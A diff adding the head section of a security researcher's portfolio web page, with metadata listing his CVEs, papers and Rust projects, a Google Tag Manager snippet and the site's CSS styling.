@@ -1,0 +1,1718 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>Pavan Nallamothu, Offensive Security Researcher</title>
+<meta name="description" content="Pavan Nallamothu is an offensive security researcher. 12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE, spanning sandbox escapes, SSRF, and access-control flaws." />
+<meta name="author" content="Pavan Nallamothu" />
+<meta name="robots" content="index, follow, max-image-preview:large" />
+<link rel="canonical" href="https://pavanchow.github.io/" />
+<meta property="og:type" content="profile" />
+<meta property="og:site_name" content="Pavan Nallamothu" />
+<meta property="og:url" content="https://pavanchow.github.io/" />
+<meta property="og:image" content="https://pavanchow.github.io/img/pavan-nallamothu.jpg" />
+<meta property="profile:first_name" content="Pavan" />
+<meta property="profile:last_name" content="Nallamothu" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@pavan0x01" />
+<meta name="twitter:creator" content="@pavan0x01" />
+<meta name="twitter:title" content="Pavan Nallamothu, Offensive Security Researcher" />
+<meta name="twitter:description" content="Security researcher with 12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE. Vulnerability research and source-code auditing." />
+<meta name="twitter:image" content="https://pavanchow.github.io/img/pavan-nallamothu.jpg" />
+<meta property="og:title" content="Pavan Nallamothu, Offensive Security Researcher" />
+<meta property="og:description" content="12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE. Vulnerability research and source-code auditing." />
+<meta name="theme-color" content="#f7f8fa" media="(prefers-color-scheme: light)" />
+<meta name="theme-color" content="#0d1117" media="(prefers-color-scheme: dark)" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<noscript><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"></noscript>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+  {
+    "@type":"Person",
+    "@id":"https://pavanchow.gitlab.io/#pavan",
+    "name":"Pavan Nallamothu",
+    "alternateName":"Pavan Chowdary",
+    "url":"https://pavanchow.gitlab.io/",
+    "mainEntityOfPage":"https://pavanchow.gitlab.io/",
+    "image":"https://pavanchow.github.io/img/pavan-nallamothu.jpg",
+    "jobTitle":"Security Researcher · Penetration Tester",
+    "description":"Security researcher and penetration tester with 12 published CVEs across Apple, CISA, NSA, AutoGPT, yt-dlp and BlueprintUE.",
+    "email":"mailto:pavankumarpre@gmail.com",
+    "telephone":"(551) 229-5068",
+    "alumniOf":{"@type":"CollegeOrUniversity","name":"Pace University"},
+    "knowsAbout":["CVE Research","SSRF","Penetration Testing","Cloud Security","DevSecOps","Broken Access Control","IDOR","Path Traversal"],
+    "sameAs":["https://www.linkedin.com/in/pavanchow/","https://github.com/pavanchow","https://github.com/pavan0x01","https://x.com/pavan0x01","https://gitlab.com/pavanchow","https://orcid.org/0009-0009-1481-6629","https://pavanchow.github.io/","https://pavanchow.gitlab.io/"]
+  },
+  {
+    "@type":"ScholarlyArticle",
+    "@id":"https://pavanchow.github.io/papers/ssrf-beyond-http.html",
+    "name":"SSRF Beyond HTTP: Egress-Path-Incomplete Guards in AI Agent Platforms",
+    "headline":"SSRF Beyond HTTP: Egress-Path-Incomplete Guards in AI Agent Platforms",
+    "author":{"@id":"https://pavanchow.gitlab.io/#pavan"},
+    "datePublished":"2026-08-24",
+    "inLanguage":"en",
+    "identifier":"https://doi.org/10.5281/zenodo.22075470",
+    "url":"https://pavanchow.github.io/papers/ssrf-beyond-http.html",
+    "sameAs":"https://doi.org/10.5281/zenodo.22075470",
+    "publisher":{"@type":"Organization","name":"Zenodo"},
+    "about":{"@id":"https://pavanchow.github.io/#epi-ssrf"}
+  },
+  {
+    "@type":"ScholarlyArticle",
+    "@id":"https://pavanchow.github.io/papers/trusting-the-filename.html",
+    "name":"Trusting the Filename: File-Write Attacks from Untrusted Archive and Download Metadata",
+    "headline":"Trusting the Filename: File-Write Attacks from Untrusted Archive and Download Metadata",
+    "author":{"@id":"https://pavanchow.gitlab.io/#pavan"},
+    "datePublished":"2026-08-24",
+    "inLanguage":"en",
+    "identifier":["https://doi.org/10.5281/zenodo.22075439","https://doi.org/10.20944/preprints202608.2314.v1"],
+    "url":"https://pavanchow.github.io/papers/trusting-the-filename.html",
+    "sameAs":["https://doi.org/10.5281/zenodo.22075439","https://doi.org/10.20944/preprints202608.2314.v1","https://www.preprints.org/manuscript/202608.2314/v1"],
+    "publisher":{"@type":"Organization","name":"Zenodo"}
+  },
+  {
+    "@type":"DefinedTerm",
+    "@id":"https://pavanchow.github.io/#epi-ssrf",
+    "name":"EPI-SSRF (Egress-Path-Incomplete SSRF)",
+    "description":"A class of server-side request forgery in which an egress guard validates only part of the request surface, leaving an alternate egress path (for example a non-HTTP protocol such as SMTP) unchecked. Formalized in the paper SSRF Beyond HTTP and instantiated on CVE-2026-33234 in AutoGPT.",
+    "url":"https://doi.org/10.5281/zenodo.22075470"
+  },
+  {"@type":"SoftwareSourceCode","name":"Oracle","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/oracle","url":"https://pavanchow.github.io/oracle/","description":"A query language whose result is an attack path across identity and network graphs, aimed at AWS IAM privilege escalation and lateral movement."},
+  {"@type":"SoftwareSourceCode","name":"Lint-Owl","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/lint-owl","url":"https://pavanchow.github.io/lint-owl/","description":"A static analyzer for Python, JavaScript, and PHP that returns the data-flow path from source to sink."},
+  {"@type":"SoftwareSourceCode","name":"Unweave","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/unweave","url":"https://pavanchow.github.io/unweave/","description":"An EVM bytecode disassembler that reconstructs intent and flags dangerous opcodes."},
+  {"@type":"SoftwareSourceCode","name":"Cipherlock","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/cipherlock","url":"https://pavanchow.github.io/cipherlock/","description":"An encryption toolkit with from-scratch ChaCha20-Poly1305 AEAD, proven against the RFC 8439 test vectors."},
+  {"@type":"SoftwareSourceCode","name":"Flint","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/flint","url":"https://pavanchow.github.io/flint/","description":"An embedded single-binary key-value store."},
+  {"@type":"SoftwareSourceCode","name":"Rift","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/rift","url":"https://pavanchow.github.io/rift/","description":"A reverse proxy whose routing rules are a compiled DSL."},
+  {"@type":"SoftwareSourceCode","name":"Metronome","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/metronome","url":"https://pavanchow.github.io/metronome/","description":"A cron scheduler built around a pure, unit-tested schedule engine you can embed."},
+  {"@type":"SoftwareSourceCode","name":"Honeycomb","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/honeycomb","url":"https://pavanchow.github.io/honeycomb/","description":"A readable global memory allocator that reports bytes-in-use and peak live memory."},
+  {"@type":"SoftwareSourceCode","name":"Semaphore","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/semaphore","url":"https://pavanchow.github.io/semaphore/","description":"A length-prefixed binary wire protocol you can read in one sitting."},
+  {"@type":"SoftwareSourceCode","name":"Timelace","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/timelace","url":"https://pavanchow.github.io/timelace/","description":"A version-control core with content-addressed blob, tree, and commit objects."},
+  {"@type":"SoftwareSourceCode","name":"Trailhead","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/trailhead","url":"https://pavanchow.github.io/trailhead/","description":"A full-text search engine with an inverted index and TF-IDF ranking."},
+  {"@type":"SoftwareSourceCode","name":"Mirage","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/mirage","url":"https://pavanchow.github.io/mirage/","description":"A panic-free stack bytecode VM with its own assembler and bytecode format."},
+  {"@type":"SoftwareSourceCode","name":"Phantom","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/phantom","url":"https://pavanchow.github.io/phantom/","description":"A CHIP-8 CPU emulator you can unit-test opcode by opcode."},
+  {"@type":"SoftwareSourceCode","name":"Sprite","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/sprite","url":"https://pavanchow.github.io/sprite/","description":"A tiny embeddable scripting language and interpreter."},
+  {"@type":"SoftwareSourceCode","name":"Prism","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/prism","url":"https://pavanchow.github.io/prism/","description":"A software rasterizer that draws 3D triangles on the CPU with a z-buffer, no GPU."},
+  {"@type":"SoftwareSourceCode","name":"Synapse","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/synapse","url":"https://pavanchow.github.io/synapse/","description":"A reverse-mode autograd engine that trains a network on XOR."},
+  {"@type":"SoftwareSourceCode","name":"Reverb","author":{"@id":"https://pavanchow.gitlab.io/#pavan"},"programmingLanguage":"Rust","codeRepository":"https://github.com/pavanchow/reverb","url":"https://pavanchow.github.io/reverb/","description":"An audio synthesis engine with oscillators, an ADSR envelope, and a hand-written WAV writer."}
+  ]
+}
+</script>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MZ63S5LS');</script>
+<!-- End Google Tag Manager -->
+<style>
+:root{
+  --bg:#0d1117;--bg-elev:#161b22;--bg-card:#1c2230;--border:#2d333b;
+  --text:#e6edf3;--text-muted:#8b949e;--accent:#58a6ff;--accent-2:#3fb950;
+  --danger:#f85149;--warn:#d29922;--code-bg:#0a0e14;
+  --shadow:0 10px 30px rgba(0,0,0,.45);--radius:14px;--t:.35s cubic-bezier(.4,0,.2,1);
+}
+[data-theme="light"]{
+  --bg:#f7f8fa;--bg-elev:#fff;--bg-card:#fff;--border:#e1e4e8;
+  --text:#1f2328;--text-muted:#59636e;--accent:#0969da;--accent-2:#1a7f37;
+  --danger:#cf222e;--warn:#9a6700;--code-bg:#f6f8fa;
+  --shadow:0 10px 30px rgba(140,149,159,.18);
+}
+[data-theme="hacker"]{
+  --bg:#000;--bg-elev:#0a0f0a;--bg-card:#0d130d;--border:#1a3a1a;
+  --text:#00ff41;--text-muted:#4a8a4a;--accent:#00ff41;--accent-2:#39ff14;
+  --danger:#ff3131;--warn:#ffe600;--code-bg:#050905;
+  --shadow:0 10px 30px rgba(0,255,65,.12);
+}
+body,header.nav,footer,.card,.adv-card,.code-wrap pre,.copy-btn,
+.theme-toggle,.nav-panel,a{
+  transition:background-color var(--t),color var(--t),border-color var(--t),box-shadow var(--t);
+}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{transition:none!important;animation:none!important}}
+
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.65;overflow-x:hidden}
+.mono{font-family:'JetBrains Mono',monospace}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+.container{max-width:1100px;margin:0 auto;padding:0 20px}
+
+#progress-bar{position:fixed;top:0;left:0;height:3px;width:0%;z-index:1000;
+  background:linear-gradient(90deg,var(--accent),var(--accent-2));box-shadow:0 0 12px var(--accent);transition:width 80ms linear}
+
+header.nav{position:sticky;top:0;z-index:100;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);overflow:visible}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:14px 0;overflow:visible}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:-.02em;font-size:1.15rem;cursor:pointer;background:none;border:none;color:var(--text);font-family:'JetBrains Mono',monospace;padding:0 10px 0 12px;min-width:0;overflow:visible}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent-2);box-shadow:0 0 10px var(--accent-2);animation:pulse 2s infinite;flex-shrink:0;margin-left:2px}
+.brand-name{position:relative;display:inline-block;white-space:nowrap}
+.brand:hover .brand-name{animation:glitch .3s cubic-bezier(.25,.46,.45,.94) both infinite}
+.brand:hover .brand-name::before,.brand:hover .brand-name::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;background:var(--bg)}
+.brand:hover .brand-name::before{left:2px;text-shadow:-1px 0 var(--danger);animation:glitch-1 .3s infinite linear alternate-reverse}
+.brand:hover .brand-name::after{left:-2px;text-shadow:1px 0 var(--accent);animation:glitch-2 .3s infinite linear alternate-reverse}
+.brand-cursor{display:inline-block;width:8px;height:1.05em;background:var(--accent);vertical-align:text-bottom;margin-left:4px;animation:blink 1s step-end infinite;flex-shrink:0}
+@keyframes glitch{0%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(-2px,-2px)}60%{transform:translate(2px,2px)}80%{transform:translate(2px,-2px)}100%{transform:translate(0)}}
+@keyframes glitch-1{0%{clip-path:inset(20% 0 60% 0)}20%{clip-path:inset(80% 0 5% 0)}40%{clip-path:inset(40% 0 40% 0)}60%{clip-path:inset(10% 0 70% 0)}80%{clip-path:inset(90% 0 10% 0)}100%{clip-path:inset(60% 0 20% 0)}}
+@keyframes glitch-2{0%{clip-path:inset(70% 0 20% 0)}20%{clip-path:inset(10% 0 80% 0)}40%{clip-path:inset(50% 0 30% 0)}60%{clip-path:inset(80% 0 10% 0)}80%{clip-path:inset(20% 0 60% 0)}100%{clip-path:inset(30% 0 50% 0)}}
+@keyframes pulse{50%{opacity:.4}}
+@keyframes blink{50%{opacity:0}}
+.nav-right{display:flex;align-items:center;gap:10px}
+.nav-links{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+.nav-links a{color:var(--text-muted);font-size:.9rem;font-weight:500}
+.nav-links a:hover{color:var(--text);text-decoration:none}
+.theme-toggle{display:flex;align-items:center;gap:8px;background:var(--bg-card);border:1px solid var(--border);color:var(--text);height:44px;padding:0 14px;border-radius:12px;cursor:pointer;font-size:.85rem;font-family:'JetBrains Mono',monospace;font-weight:600;flex-shrink:0}
+.theme-toggle:hover{border-color:var(--accent);color:var(--accent)}
+.theme-toggle .ico{font-size:1rem}
+.hamburger{display:none;background:var(--bg-card);border:1px solid var(--border);color:var(--text);width:44px;height:44px;border-radius:12px;cursor:pointer;font-size:1.2rem;align-items:center;justify-content:center;flex-shrink:0}
+.nav-panel{display:none;flex-direction:column;gap:6px;padding:10px 20px 16px;border-bottom:1px solid var(--border);background:var(--bg-elev)}
+.nav-panel.open{display:flex}
+.nav-panel a{padding:12px 6px;color:var(--text);font-weight:500;border-bottom:1px solid var(--border)}
+.nav-panel a:last-child{border-bottom:none}
+@media(max-width:900px){.nav-links{display:none}.hamburger{display:flex}.theme-toggle .label{display:none}.theme-toggle{padding:0 10px}}
+
+.hero{padding:clamp(60px,12vw,120px) 0 clamp(50px,8vw,80px);position:relative;overflow:hidden}
+#matrix-canvas{position:absolute;inset:0;width:100%;height:100%;z-index:0;opacity:.15;pointer-events:none}
+.hero>.container{position:relative;z-index:1}
+.hero::before{content:'';position:absolute;inset:0;pointer-events:none;z-index:0;
+  background:radial-gradient(circle at 18% 25%,color-mix(in srgb,var(--accent) 16%,transparent),transparent 50%),
+             radial-gradient(circle at 82% 70%,color-mix(in srgb,var(--accent-2) 13%,transparent),transparent 55%)}
+.hero-tag{color:var(--accent-2);font-family:'JetBrains Mono',monospace;font-size:.85rem;letter-spacing:.12em;text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-size:clamp(2rem,7vw,3.8rem);font-weight:800;letter-spacing:-.03em;line-height:1.08}
+.hero .typewriter-line{color:var(--accent);border-right:2px solid var(--accent);display:inline-block;min-height:1.15em;white-space:nowrap;max-width:100%;overflow:hidden;text-overflow:ellipsis;vertical-align:bottom}
+.hero .caret{animation:blink 1s step-end infinite}
+.hero .lead{color:var(--text-muted);font-size:clamp(1rem,2.5vw,1.15rem);max-width:680px;margin-top:20px}
+.hero-meta{display:flex;gap:14px 22px;flex-wrap:wrap;margin-top:30px;font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--text-muted)}
+.hero-meta span strong{color:var(--text)}
+.hero-contact{display:flex;gap:14px 22px;flex-wrap:wrap;margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:.82rem}
+.hero-contact a{color:var(--accent)}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px;margin-top:42px}
+.stat{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
+.stat .n{font-size:1.9rem;font-weight:800;color:var(--accent);font-family:'JetBrains Mono',monospace}
+.stat .l{font-size:.78rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;margin-top:4px}
+
+.hero-grid{display:grid;grid-template-columns:1fr 240px;gap:44px;align-items:center}
+.hero-photo{display:flex;justify-content:center}
+.hero-photo img{width:240px;height:240px;border-radius:50%;object-fit:cover;border:3px solid var(--accent);box-shadow:0 0 44px color-mix(in srgb,var(--accent) 35%,transparent);background:var(--bg-card)}
+@media(max-width:820px){.hero-grid{grid-template-columns:1fr;gap:20px;justify-items:center;text-align:center}.hero-photo{order:-1}.hero-photo img{width:168px;height:168px}.hero-meta,.hero-contact{justify-content:center}.hero .lead{margin-left:auto;margin-right:auto}}
+.section{padding:clamp(50px,8vw,70px) 0}
+.section-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:34px}
+.section-title{font-size:clamp(1.4rem,4vw,1.9rem);font-weight:700;letter-spacing:-.02em}
+.section-sub{color:var(--text-muted);font-size:.95rem;margin-top:6px;max-width:620px}
+
+.grid{display:grid;gap:22px}
+.grid-3{grid-template-columns:repeat(auto-fill,minmax(290px,1fr))}
+.grid-2{grid-template-columns:repeat(auto-fill,minmax(340px,1fr))}
+.rec-scroll{display:grid;grid-auto-flow:column;grid-auto-columns:calc((100% - 44px)/3);gap:22px;overflow-x:auto;overflow-y:hidden;scroll-snap-type:x proximity;padding:18px 6px 14px;-webkit-overflow-scrolling:touch;scrollbar-width:none;cursor:grab}
+.rec-scroll::-webkit-scrollbar{display:none}
+.rec-scroll.dragging{cursor:grabbing;scroll-snap-type:none;user-select:none}
+.rec-scroll>.card{scroll-snap-align:start;opacity:1;transform:translateY(0)}
+.rec-scroll>.card:hover{transform:translateY(-8px)}
+.rec-scroll[data-marquee]{scroll-snap-type:none;-webkit-mask-image:linear-gradient(to right,transparent,#000 5%,#000 95%,transparent);mask-image:linear-gradient(to right,transparent,#000 5%,#000 95%,transparent)}
+.rec-jog{display:flex;align-items:center;justify-content:center;position:relative;height:36px;margin-top:8px}
+.rec-jog-track{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:min(320px,60%);height:4px;border-radius:999px;background:color-mix(in srgb,var(--border) 75%,transparent)}
+.rec-jog-knob{position:relative;z-index:1;width:60px;height:26px;border-radius:999px;border:1px solid var(--border);background:var(--bg-card);cursor:grab;display:flex;align-items:center;justify-content:center;gap:4px;box-shadow:var(--shadow);touch-action:none;transition:transform .3s cubic-bezier(.34,1.56,.64,1),border-color var(--t)}
+.rec-jog-knob:hover{border-color:var(--accent)}
+.rec-jog-knob.grabbing{cursor:grabbing;border-color:var(--accent);transition:border-color var(--t)}
+.rec-jog-knob i{width:3px;height:12px;border-radius:2px;background:color-mix(in srgb,var(--accent) 65%,transparent)}
+@media(max-width:900px){.rec-scroll{grid-auto-columns:calc((100% - 22px)/2)}}
+@media(max-width:640px){.rec-scroll{grid-auto-columns:86%}}
+.card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:26px;position:relative;cursor:pointer;transform:translateY(18px);opacity:0;transition:transform var(--t),box-shadow var(--t),border-color var(--t),opacity .6s ease}
+.card.revealed{transform:translateY(0);opacity:1}
+.card:hover{transform:translateY(-8px);box-shadow:var(--shadow);border-color:var(--accent)}
+.card::after{content:'';position:absolute;left:0;top:0;height:3px;width:0;border-radius:var(--radius) var(--radius) 0 0;background:linear-gradient(90deg,var(--accent),var(--accent-2));transition:width var(--t)}
+.card:hover::after{width:100%}
+.cve-viewport{position:relative;overflow:hidden;padding:30px 0 34px;-webkit-mask-image:linear-gradient(to right,transparent 0,#000 7%,#000 93%,transparent 100%);mask-image:linear-gradient(to right,transparent 0,#000 7%,#000 93%,transparent 100%)}
+.cve-track{display:flex;width:max-content;animation:cve-marquee 60s linear infinite}
+.cve-viewport:hover .cve-track,.cve-track:focus-within{animation-play-state:paused}
+.cve-track>.card{flex:0 0 auto;width:340px;margin-right:20px;opacity:1;transform:none}
+.cve-track>.card:hover{transform:translateY(-8px)}
+@keyframes cve-marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.cve-scroll-hint{text-align:center;color:var(--text-muted);font-size:.78rem;font-family:'JetBrains Mono',monospace;margin-top:14px}
+@media(prefers-reduced-motion:reduce){.cve-track{animation:none;flex-wrap:wrap;justify-content:center;gap:20px}.cve-viewport{-webkit-mask-image:none;mask-image:none}.cve-track>.card{margin-right:0}}
+@media(max-width:900px){.cve-track>.card{width:300px}}
+@media(max-width:640px){.cve-track>.card{width:82vw}}
+.card-tag{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--accent);border:1px solid var(--accent);padding:3px 9px;border-radius:999px;margin-bottom:12px;text-transform:uppercase;letter-spacing:.07em}
+.card h3{font-size:1.1rem;font-weight:700;margin-bottom:8px;line-height:1.35}
+.card p{color:var(--text-muted);font-size:.9rem}
+.card-meta{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:.74rem;color:var(--text-muted);gap:8px;flex-wrap:wrap}
+.sev{font-family:'JetBrains Mono',monospace;font-size:.66rem;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em;font-weight:600}
+.sev.critical{background:color-mix(in srgb,var(--danger) 22%,transparent);color:var(--danger)}
+.sev.high{background:color-mix(in srgb,#ff7b3a 22%,transparent);color:#ff7b3a}
+.sev.medium{background:color-mix(in srgb,var(--warn) 22%,transparent);color:var(--warn)}
+.sev.low{background:color-mix(in srgb,var(--accent-2) 22%,transparent);color:var(--accent-2)}
+
+.adv-card{background:var(--bg-card);border:1px solid var(--border);border-left:4px solid var(--text-muted);border-radius:12px;padding:20px;transition:transform var(--t),border-color var(--t)}
+.adv-card:hover{transform:translateY(-5px);border-color:var(--border);border-left-color:var(--accent)}
+.adv-card.sev-high{border-left-color:#ff7b3a}
+.adv-card.sev-medium{border-left-color:var(--warn)}
+.adv-head{display:flex;justify-content:space-between;align-items:flex-start;gap:10px;margin-bottom:10px}
+.adv-id{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.9rem;color:var(--accent);word-break:break-all}
+.adv-summary{font-size:.88rem;color:var(--text);line-height:1.5;margin-bottom:12px}
+.adv-foot{display:flex;justify-content:space-between;align-items:center;font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text-muted);gap:8px;flex-wrap:wrap}
+.adv-repo{background:var(--bg-elev);padding:3px 8px;border-radius:6px}
+
+.lab-tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+#lab-tabs{flex-wrap:nowrap;overflow-x:auto;padding-bottom:8px;scrollbar-width:thin;-webkit-overflow-scrolling:touch}
+.lab-tab{flex:0 0 auto;white-space:nowrap;background:var(--bg-card);border:1px solid var(--border);color:var(--text-muted);padding:8px 14px;border-radius:8px;cursor:pointer;font-family:'JetBrains Mono',monospace;font-size:.78rem;transition:all var(--t)}
+.lab-tab.active,.lab-tab:hover{color:var(--accent);border-color:var(--accent)}
+.lab-tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.terminal{background:var(--code-bg);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:var(--shadow);position:relative}
+.terminal-bar{display:flex;align-items:center;gap:8px;padding:12px 16px;background:var(--bg-elev);border-bottom:1px solid var(--border)}
+.terminal-bar .tdot{width:12px;height:12px;border-radius:50%}
+.terminal-bar .r{background:#ff5f56}.terminal-bar .y{background:#ffbd2e}.terminal-bar .g{background:#27c93f}
+.terminal-bar .title{margin-left:10px;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--text-muted)}
+.terminal-body{padding:20px;font-family:'JetBrains Mono',monospace;font-size:.84rem;line-height:1.7;color:var(--text);min-height:320px;white-space:pre-wrap;word-break:break-word;position:relative;overflow-y:auto;max-height:500px}
+.terminal-body .boot{color:var(--text-muted)}
+.terminal-body .ok{color:var(--accent-2)}
+.terminal-body .warn{color:var(--warn)}
+.terminal-body .err{color:var(--danger)}
+.terminal-body .acc{color:var(--accent)}
+.terminal-body .cursor{display:inline-block;width:9px;height:1.05em;background:var(--accent);vertical-align:text-bottom;animation:blink 1s step-end infinite;margin-left:2px}
+.scanline{position:absolute;inset:0;pointer-events:none;background:linear-gradient(transparent 50%,color-mix(in srgb,var(--accent) 4%,transparent) 50%);background-size:100% 4px;opacity:.5;mix-blend-mode:overlay}
+
+.cli-terminal{background:var(--code-bg);border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:var(--shadow);position:relative}
+.cli-body{padding:20px;font-family:'JetBrains Mono',monospace;font-size:.84rem;line-height:1.7;color:var(--text);min-height:340px;max-height:520px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;position:relative}
+.cli-input-line{display:flex;gap:8px;align-items:center}
+.cli-prompt{color:var(--accent-2);white-space:nowrap}
+.cli-input{background:none;border:none;color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.84rem;outline:none;width:100%;caret-color:var(--accent)}
+.cli-output-line{margin-bottom:4px;white-space:pre-wrap;word-break:break-word}
+.cli-cmd-line{margin-bottom:4px;color:var(--text)}
+.cli-table{width:100%;border-collapse:collapse;margin:8px 0}
+.cli-table td{padding:3px 12px 3px 0;vertical-align:top}
+.cli-table td:first-child{color:var(--accent-2);white-space:nowrap}
+.cli-table td:last-child{color:var(--text)}
+.cli-link{color:var(--accent);text-decoration:underline;cursor:pointer}
+.cli-link:hover{color:var(--accent-2)}
+
+.exp-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:26px;transform:translateY(18px);opacity:0;transition:transform var(--t),box-shadow var(--t),border-color var(--t),opacity .6s ease}
+.exp-card.revealed{transform:translateY(0);opacity:1}
+.exp-card:hover{box-shadow:var(--shadow);border-color:var(--accent)}
+.exp-role{font-size:1.05rem;font-weight:700;color:var(--text)}
+.exp-org{color:var(--accent);font-size:.92rem;margin-top:2px}
+.exp-dates{font-family:'JetBrains Mono',monospace;font-size:.74rem;color:var(--text-muted);margin-top:4px}
+.exp-card ul{margin-top:12px;padding-left:20px}
+.exp-card li{color:var(--text-muted);font-size:.88rem;margin-bottom:6px;line-height:1.5}
+
+.cert-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px}
+.cert-item{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-size:.84rem;color:var(--text);display:flex;align-items:center;gap:8px}
+.cert-item::before{content:'✓';color:var(--accent-2);font-weight:700;flex-shrink:0}
+
+.community-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
+.community-item{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:14px 16px}
+.community-item .ci-org{font-weight:600;color:var(--accent);font-size:.88rem}
+.community-item .ci-role{color:var(--text);font-size:.84rem;margin-top:2px}
+.community-item .ci-desc{color:var(--text-muted);font-size:.78rem;margin-top:4px}
+
+footer{border-top:1px solid var(--border);padding:36px 0;margin-top:30px;color:var(--text-muted);font-size:.85rem}
+footer .container{display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px}
+footer a{color:var(--text-muted)}footer a:hover{color:var(--accent)}
+
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--accent-2);color:#000;padding:10px 18px;border-radius:10px;font-weight:600;font-size:.88rem;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;z-index:2000}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
